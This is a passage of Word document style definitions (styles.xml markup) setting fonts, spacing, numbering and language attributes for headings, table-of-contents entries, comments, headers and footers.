  <w:style w:type="character" w:customStyle="1" w:styleId="UnresolvedMention1">
    <w:name w:val="Unresolved Mention1"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="00A22B7C"/>
    <w:rPr>
      <w:color w:val="808080"/>
      <w:shd w:val="clear" w:color="auto" w:fill="E6E6E6"/>
    </w:rPr>
  </w:style>
  <w:style w:type="table" w:customStyle="1" w:styleId="GridTable1Light1">
    <w:name w:val="Grid Table 1 Light1"/>
    <w:basedOn w:val="TableNormal"/>
    <w:uiPriority w:val="46"/>
    <w:rsid w:val="00C518F8"/>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C518F8"/>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B81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142A"/>
    <w:rPr>
      <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="CommentReference">
    <w:name w:val="annotation reference"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="001677EB"/>
    <w:rPr>
      <w:sz w:val="18"/>
      <w:szCs w:val="18"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="CommentText">
    <w:name w:val="annotation text"/>
    <w:basedOn w:val="Normal"/>
    <w:link w:val="CommentTextChar"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="001677EB"/>
    <w:pPr>
      <w:spacing w:line="240" w:lineRule="auto"/>
    </w:pPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="CommentTextChar">
    <w:name w:val="Comment Text Char"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:link w:val="CommentText"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:rsid w:val="001677EB"/>
    <w:rPr>
      <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
      <w:sz w:val="24"/>
      <w:szCs w:val="24"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="CommentSubject">
    <w:name w:val="annotation subject"/>
    <w:basedOn w:val="CommentText"/>
    <w:next w:val="CommentText"/>
    <w:link w:val="CommentSubjectChar"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="001677EB"/>
    <w:rPr>
      <w:b/>
      <w:bCs/>
      <w:sz w:val="20"/>
      <w:szCs w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="CommentSubjectChar">
    <w:name w:val="Comment Subject Char"/>
    <w:basedOn w:val="CommentTextChar"/>
    <w:link w:val="CommentSubject"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:rsid w:val="001677EB"/>
    <w:rPr>
      <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>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200883"/>
    <w:pPr>
      <w:spacing w:before="120" w:after="120" w:line="360" w:lineRule="auto"/>
      <w:jc w:val="both"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
      <w:sz w:val="24"/>
      <w:szCs w:val="24"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Heading1">
    <w:name w:val="heading 1"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:link w:val="Heading1Char"/>
    <w:uiPriority w:val="9"/>
    <w:qFormat/>
    <w:rsid w:val="000C4765"/>
    <w:pPr>
      <w:keepNext/>
      <w:numPr>
        <w:numId w:val="2"/>
      </w:numPr>
      <w:spacing w:before="0" w:after="240" w:line="240" w:lineRule="auto"/>
      <w:jc w:val="center"/>
      <w:outlineLvl w:val="0"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:eastAsia="Times New Roman"/>
      <w:b/>
      <w:kern w:val="32"/>
      <w:sz w:val="28"/>
      <w:szCs w:val="28"/>
      <w:lang w:bidi="he-IL"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Heading2">
    <w:name w:val="heading 2"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:link w:val="Heading2Char"/>
    <w:uiPriority w:val="9"/>
    <w:qFormat/>
    <w:rsid w:val="006354D3"/>
    <w:pPr>
      <w:keepNext/>
      <w:numPr>
        <w:ilvl w:val="1"/>
        <w:numId w:val="2"/>
      </w:numPr>
      <w:spacing w:before="240" w:after="60"/>
      <w:outlineLvl w:val="1"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:eastAsia="Times New Roman"/>
      <w:b/>
      <w:bCs/>
      <w:iCs/>
      <w:szCs w:val="28"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Heading3">
    <w:name w:val="heading 3"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:link w:val="Heading3Char"/>
    <w:uiPriority w:val="9"/>
    <w:qFormat/>
    <w:rsid w:val="007524B3"/>
    <w:pPr>
      <w:keepNext/>
      <w:numPr>
        <w:ilvl w:val="2"/>
        <w:numId w:val="2"/>
      </w:numPr>
      <w:spacing w:before="240" w:after="60"/>
      <w:outlineLvl w:val="2"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:eastAsia="Times New Roman"/>
      <w:b/>
      <w:bCs/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Heading4">
    <w:name w:val="heading 4"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:link w:val="Heading4Char"/>
    <w:uiPriority w:val="9"/>
    <w:qFormat/>
    <w:rsid w:val="003F0CC3"/>
    <w:pPr>
      <w:keepNext/>
      <w:numPr>
        <w:ilvl w:val="3"/>
        <w:numId w:val="2"/>
      </w:numPr>
      <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      <w:jc w:val="center"/>
      <w:outlineLvl w:val="3"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman"/>
      <w:b/>
      <w:bCs/>
      <w:sz w:val="20"/>
      <w:szCs w:val="20"/>
      <w:lang w:bidi="he-IL"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Heading5">
    <w:name w:val="heading 5"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:link w:val="Heading5Char"/>
    <w:uiPriority w:val="9"/>
    <w:qFormat/>
    <w:rsid w:val="001E0CF4"/>
    <w:pPr>
      <w:numPr>
        <w:ilvl w:val="4"/>
        <w:numId w:val="2"/>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qFormat/>
    <w:rsid w:val="001E0CF4"/>
    <w:pPr>
      <w:numPr>
        <w:ilvl w:val="5"/>
        <w:numId w:val="2"/>
      </w:num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uiPriority w:val="9"/>
    <w:qFormat/>
    <w:rsid w:val="003F0CC3"/>
    <w:pPr>
      <w:keepNext/>
      <w:numPr>
        <w:ilvl w:val="6"/>
        <w:numId w:val="2"/>
      </w:numPr>
      <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      <w:outlineLvl w:val="6"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman"/>
      <w:b/>
      <w:bCs/>
      <w:sz w:val="20"/>
      <w:szCs w:val="20"/>
      <w:lang w:bidi="he-IL"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Heading8">
    <w:name w:val="heading 8"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:link w:val="Heading8Char"/>
    <w:uiPriority w:val="9"/>
    <w:qFormat/>
    <w:rsid w:val="001E0CF4"/>
    <w:pPr>
      <w:numPr>
        <w:ilvl w:val="7"/>
        <w:numId w:val="2"/>
      </w:numPr>
      <w:spacing w:before="240" w:after="60"/>
      <w:outlineLvl w:val="7"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="Calibri" w:eastAsia="Times New Roman" w:hAnsi="Calibri" w:cs="Times New Roman"/>
      <w:i/>
      <w:iCs/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Heading9">
    <w:name w:val="heading 9"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:link w:val="Heading9Char"/>
    <w:uiPriority w:val="9"/>
    <w:qFormat/>
    <w:rsid w:val="001E0CF4"/>
    <w:pPr>
      <w:numPr>
        <w:ilvl w:val="8"/>
        <w:numId w:val="2"/>
      </w:num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F1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9272CC"/>
    <w:rPr>
      <w:color w:val="0000FF"/>
      <w:u w:val="single"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="Heading1Char">
    <w:name w:val="Heading 1 Char"/>
    <w:link w:val="Heading1"/>
    <w:uiPriority w:val="9"/>
    <w:rsid w:val="000C4765"/>
    <w:rPr>
      <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
      <w:b/>
      <w:kern w:val="32"/>
      <w:sz w:val="28"/>
      <w:szCs w:val="28"/>
      <w:lang w:val="el-GR" w:bidi="he-IL"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="Heading4Char">
    <w:name w:val="Heading 4 Char"/>
    <w:link w:val="Heading4"/>
    <w:uiPriority w:val="9"/>
    <w:rsid w:val="003F0CC3"/>
    <w:rPr>
      <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Arial"/>
      <w:b/>
      <w:bCs/>
      <w:lang w:val="el-GR" w:bidi="he-IL"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="Heading7Char">
    <w:name w:val="Heading 7 Char"/>
    <w:link w:val="Heading7"/>
    <w:uiPriority w:val="9"/>
    <w:rsid w:val="003F0CC3"/>
    <w:rPr>
      <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Arial"/>
      <w:b/>
      <w:bCs/>
      <w:lang w:val="el-GR" w:bidi="he-IL"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Header">
    <w:name w:val="header"/>
    <w:basedOn w:val="Normal"/>
    <w:link w:val="HeaderChar"/>
    <w:uiPriority w:val="99"/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="00EC474E"/>
    <w:pPr>
      <w:tabs>
        <w:tab w:val="center" w:pos="4320"/>
        <w:tab w:val="right" w:pos="8640"/>
      </w:tabs>
    </w:pPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="HeaderChar">
    <w:name w:val="Header Char"/>
    <w:link w:val="Header"/>
    <w:uiPriority w:val="99"/>
    <w:rsid w:val="00EC474E"/>
    <w:rPr>
      <w:sz w:val="22"/>
      <w:szCs w:val="22"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Footer">
    <w:name w:val="footer"/>
    <w:basedOn w:val="Normal"/>
    <w:link w:val="FooterChar"/>
    <w:uiPriority w:val="99"/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="00EC474E"/>
    <w:pPr>
      <w:tabs>
        <w:tab w:val="center" w:pos="4320"/>
        <w:tab w:val="right" w:pos="8640"/>
      </w:tabs>
    </w:pPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="FooterChar">
    <w:name w:val="Footer Char"/>
    <w:link w:val="Footer"/>
    <w:uiPriority w:val="99"/>
    <w:rsid w:val="00EC474E"/>
    <w:rPr>
      <w:sz w:val="22"/>
      <w:szCs w:val="22"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="Default">
    <w:name w:val="Default"/>
    <w:rsid w:val="00B36368"/>
    <w:pPr>
      <w:widowControl w:val="0"/>
      <w:autoSpaceDE w:val="0"/>
      <w:autoSpaceDN w:val="0"/>
      <w:adjustRightInd w:val="0"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman"/>
      <w:color w:val="000000"/>
      <w:sz w:val="24"/>
      <w:szCs w:val="24"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="CM31">
    <w:name w:val="CM31"/>
    <w:basedOn w:val="Default"/>
    <w:next w:val="Default"/>
    <w:uiPriority w:val="99"/>
    <w:rsid w:val="00165B67"/>
    <w:rPr>
      <w:color w:val="auto"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="CM30">
    <w:name w:val="CM30"/>
    <w:basedOn w:val="Default"/>
    <w:next w:val="Default"/>
    <w:uiPriority w:val="99"/>
    <w:rsid w:val="00165B67"/>
    <w:rPr>
      <w:color w:val="auto"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="CM33">
    <w:name w:val="CM33"/>
    <w:basedOn w:val="Default"/>
    <w:next w:val="Default"/>
    <w:uiPriority w:val="99"/>
    <w:rsid w:val="00961AD7"/>
    <w:rPr>
      <w:color w:val="auto"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="CM35">
    <w:name w:val="CM35"/>
    <w:basedOn w:val="Default"/>
    <w:next w:val="Default"/>
    <w:uiPriority w:val="99"/>
    <w:rsid w:val="00961AD7"/>
    <w:rPr>
      <w:color w:val="auto"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="CM19">
    <w:name w:val="CM19"/>
    <w:basedOn w:val="Default"/>
    <w:next w:val="Default"/>
    <w:uiPriority w:val="99"/>
    <w:rsid w:val="00961AD7"/>
    <w:pPr>
      <w:spacing w:line="413" w:lineRule="atLeast"/>
    </w:pPr>
    <w:rPr>
      <w:color w:val="auto"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="CM41">
    <w:name w:val="CM41"/>
    <w:basedOn w:val="Default"/>
    <w:next w:val="Default"/>
    <w:uiPriority w:val="99"/>
    <w:rsid w:val="00961AD7"/>
    <w:rPr>
      <w:color w:val="auto"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="CM44">
    <w:name w:val="CM44"/>
    <w:basedOn w:val="Default"/>
    <w:next w:val="Default"/>
    <w:uiPriority w:val="99"/>
    <w:rsid w:val="00961AD7"/>
    <w:rPr>
      <w:color w:val="auto"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="BalloonText">
    <w:name w:val="Balloon Text"/>
    <w:basedOn w:val="Normal"/>
    <w:link w:val="BalloonTextChar"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="001C783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C7838"/>
    <w:rPr>
      <w:rFonts w:ascii="Tahoma" w:hAnsi="Tahoma" w:cs="Tahoma"/>
      <w:sz w:val="16"/>
      <w:szCs w:val="16"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="Heading2Char">
    <w:name w:val="Heading 2 Char"/>
    <w:link w:val="Heading2"/>
    <w:uiPriority w:val="9"/>
    <w:rsid w:val="006354D3"/>
    <w:rPr>
      <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
      <w:b/>
      <w:bCs/>
      <w:iCs/>
      <w:sz w:val="24"/>
      <w:szCs w:val="28"/>
      <w:lang w:val="el-GR"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="Heading3Char">
    <w:name w:val="Heading 3 Char"/>
    <w:link w:val="Heading3"/>
    <w:uiPriority w:val="9"/>
    <w:rsid w:val="007524B3"/>
    <w:rPr>
      <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
      <w:b/>
      <w:bCs/>
      <w:sz w:val="24"/>
      <w:szCs w:val="24"/>
      <w:lang w:val="el-GR"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="Heading5Char">
    <w:name w:val="Heading 5 Char"/>
    <w:link w:val="Heading5"/>
    <w:uiPriority w:val="9"/>
    <w:rsid w:val="001E0CF4"/>
    <w:rPr>
      <w:rFonts w:eastAsia="Times New Roman"/>
      <w:b/>
      <w:bCs/>
      <w:i/>
      <w:iCs/>
      <w:sz w:val="26"/>
      <w:szCs w:val="26"/>
      <w:lang w:val="el-GR"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="Heading6Char">
    <w:name w:val="Heading 6 Char"/>
    <w:link w:val="Heading6"/>
    <w:uiPriority w:val="9"/>
    <w:rsid w:val="001E0CF4"/>
    <w:rPr>
      <w:rFonts w:eastAsia="Times New Roman"/>
      <w:b/>
      <w:bCs/>
      <w:sz w:val="24"/>
      <w:szCs w:val="24"/>
      <w:lang w:val="el-GR"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="Heading8Char">
    <w:name w:val="Heading 8 Char"/>
    <w:link w:val="Heading8"/>
    <w:uiPriority w:val="9"/>
    <w:rsid w:val="001E0CF4"/>
    <w:rPr>
      <w:rFonts w:eastAsia="Times New Roman"/>
      <w:i/>
      <w:iCs/>
      <w:sz w:val="24"/>
      <w:szCs w:val="24"/>
      <w:lang w:val="el-GR"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="Heading9Char">
    <w:name w:val="Heading 9 Char"/>
    <w:link w:val="Heading9"/>
    <w:uiPriority w:val="9"/>
    <w:rsid w:val="001E0CF4"/>
    <w:rPr>
      <w:rFonts w:ascii="Cambria" w:eastAsia="Times New Roman" w:hAnsi="Cambria"/>
      <w:sz w:val="24"/>
      <w:szCs w:val="24"/>
      <w:lang w:val="el-GR"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="ListParagraph">
    <w:name w:val="List Paragraph"/>
    <w:basedOn w:val="Normal"/>
    <w:uiPriority w:val="34"/>
    <w:qFormat/>
    <w:rsid w:val="00EF777A"/>
    <w:pPr>
      <w:ind w:left="720"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="TOCHeading">
    <w:name w:val="TOC Heading"/>
    <w:basedOn w:val="Heading1"/>
    <w:next w:val="Normal"/>
    <w:uiPriority w:val="39"/>
    <w:qFormat/>
    <w:rsid w:val="004C2152"/>
    <w:pPr>
      <w:keepLines/>
      <w:numPr>
        <w:numId w:val="0"/>
      </w:numPr>
      <w:spacing w:before="480" w:after="0"/>
      <w:jc w:val="left"/>
      <w:outlineLvl w:val="9"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria" w:cs="Times New Roman"/>
      <w:bCs/>
      <w:color w:val="365F91"/>
      <w:lang w:bidi="ar-SA"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="TOC1">
    <w:name w:val="toc 1"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:autoRedefine/>
    <w:uiPriority w:val="39"/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="004C2152"/>
    <w:pPr>
      <w:spacing w:before="360" w:after="0"/>
      <w:jc w:val="left"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
      <w:b/>
      <w:bCs/>
      <w:caps/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="TOC2">
    <w:name w:val="toc 2"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:autoRedefine/>
    <w:uiPriority w:val="39"/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="004C2152"/>
    <w:pPr>
      <w:spacing w:before="240" w:after="0"/>
      <w:jc w:val="left"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
      <w:b/>
      <w:bCs/>
      <w:sz w:val="20"/>
      <w:szCs w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="TOC3">
    <w:name w:val="toc 3"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:autoRedefine/>
    <w:uiPriority w:val="39"/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="004C2152"/>
    <w:pPr>
      <w:spacing w:before="0" w:after="0"/>
      <w:ind w:left="240"/>
      <w:jc w:val="left"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
      <w:sz w:val="20"/>
      <w:szCs w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="PEGGY">
    <w:name w:val="PEGGY"/>
    <w:basedOn w:val="Heading1"/>
    <w:link w:val="PEGGYChar"/>
    <w:qFormat/>
    <w:rsid w:val="00B1709A"/>
    <w:pPr>
      <w:numPr>
        <w:numId w:val="0"/>
      </w:numPr>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Caption">
    <w:name w:val="caption"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:uiPriority w:val="35"/>
    <w:qFormat/>
    <w:rsid w:val="00215036"/>
    <w:rPr>
      <w:b/>
      <w:bCs/>
      <w:sz w:val="20"/>
      <w:szCs w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="PEGGYChar">
    <w:name w:val="PEGGY Char"/>
    <w:basedOn w:val="Heading1Char"/>
    <w:link w:val="PEGGY"/>
    <w:rsid w:val="004C2EF0"/>
    <w:rPr>
      <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
      <w:b/>
      <w:kern w:val="32"/>
      <w:sz w:val="28"/>
      <w:szCs w:val="28"/>
      <w:lang w:val="el-GR" w:bidi="he-IL"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="TableofFigures">
    <w:name w:val="table of figures"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:uiPriority w:val="99"/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="0036629B"/>
  </w:style>
  <w:style w:type="paragraph" w:styleId="FootnoteText">
    <w:name w:val="footnote text"/>
    <w:basedOn w:val="Normal"/>
    <w:link w:val="FootnoteTextChar"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="007E6FEF"/>
    <w:rPr>
      <w:sz w:val="20"/>
      <w:szCs w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="FootnoteTextChar">
    <w:name w:val="Footnote Text Char"/>
    <w:link w:val="FootnoteText"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:rsid w:val="007E6FEF"/>
    <w:rPr>
      <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
      <w:lang w:val="el-GR"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="FootnoteReference">
    <w:name w:val="footnote reference"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="007E6FEF"/>
    <w:rPr>
      <w:vertAlign w:val="superscript"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="TOC4">
    <w:name w:val="toc 4"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:autoRedefine/>
    <w:uiPriority w:val="39"/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="003B0BB2"/>
    <w:pPr>
      <w:spacing w:before="0" w:after="0"/>
      <w:ind w:left="480"/>
      <w:jc w:val="left"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
      <w:sz w:val="20"/>
      <w:szCs w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="TOC5">
    <w:name w:val="toc 5"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:autoRedefine/>
    <w:uiPriority w:val="39"/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="003B0BB2"/>
    <w:pPr>
      <w:spacing w:before="0" w:after="0"/>
      <w:ind w:left="720"/>
      <w:jc w:val="left"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
      <w:sz w:val="20"/>
      <w:szCs w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="TOC6">
    <w:name w:val="toc 6"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:autoRedefine/>
    <w:uiPriority w:val="39"/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="003B0BB2"/>
    <w:pPr>
      <w:spacing w:before="0" w:after="0"/>
      <w:ind w:left="960"/>
      <w:jc w:val="left"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
      <w:sz w:val="20"/>
      <w:szCs w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="TOC7">
    <w:name w:val="toc 7"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:autoRedefine/>
    <w:uiPriority w:val="39"/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="003B0BB2"/>
    <w:pPr>
      <w:spacing w:before="0" w:after="0"/>
      <w:ind w:left="1200"/>
      <w:jc w:val="left"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
      <w:sz w:val="20"/>
      <w:szCs w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="TOC8">
    <w:name w:val="toc 8"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:autoRedefine/>
    <w:uiPriority w:val="39"/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="003B0BB2"/>
    <w:pPr>
      <w:spacing w:before="0" w:after="0"/>
      <w:ind w:left="1440"/>
      <w:jc w:val="left"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
      <w:sz w:val="20"/>
      <w:szCs w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="TOC9">
    <w:name w:val="toc 9"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:autoRedefine/>
    <w:uiPriority w:val="39"/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="003B0BB2"/>
    <w:pPr>
      <w:spacing w:before="0" w:after="0"/>
      <w:ind w:left="1680"/>
      <w:jc w:val="left"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
      <w:sz w:val="20"/>
      <w:szCs w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="Style1">
    <w:name w:val="Style1"/>
    <w:basedOn w:val="Heading2"/>
    <w:link w:val="Style1Char"/>
    <w:qFormat/>
    <w:rsid w:val="00BC6AE0"/>
    <w:pPr>
      <w:spacing w:before="0" w:after="120" w:line="240" w:lineRule="auto"/>
    </w:pPr>
  </w:style>
  <w:style w:type="character" w:styleId="FollowedHyperlink">
    <w:name w:val="FollowedHyperlink"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="00666F08"/>
    <w:rPr>
      <w:color w:val="800080"/>
      <w:u w:val="single"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="Style1Char">
    <w:name w:val="Style1 Char"/>
    <w:basedOn w:val="Heading2Char"/>
    <w:link w:val="Style1"/>
    <w:rsid w:val="00BC6AE0"/>
    <w:rPr>
      <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
      <w:b/>
      <w:bCs/>
      <w:iCs/>
      <w:sz w:val="24"/>
      <w:szCs w:val="28"/>
      <w:lang w:val="el-GR"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="shorttext">
    <w:name w:val="short_text"/>
    <w:rsid w:val="0096360A"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="UnresolvedMention1">
    <w:name w:val="Unresolved Mention1"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="00A22B7C"/>
    <w:rPr>
      <w:color w:val="808080"/>
      <w:shd w:val="clear" w:color="auto" w:fill="E6E6E6"/>
    </w:rPr>
  </w:style>
  <w:style w:type="table" w:customStyle="1" w:styleId="GridTable1Light1">
    <w:name w:val="Grid Table 1 Light1"/>
    <w:basedOn w:val="TableNormal"/>
    <w:uiPriority w:val="46"/>
    <w:rsid w:val="00C518F8"/>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C518F8"/>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B81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142A"/>
    <w:rPr>
      <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="CommentReference">
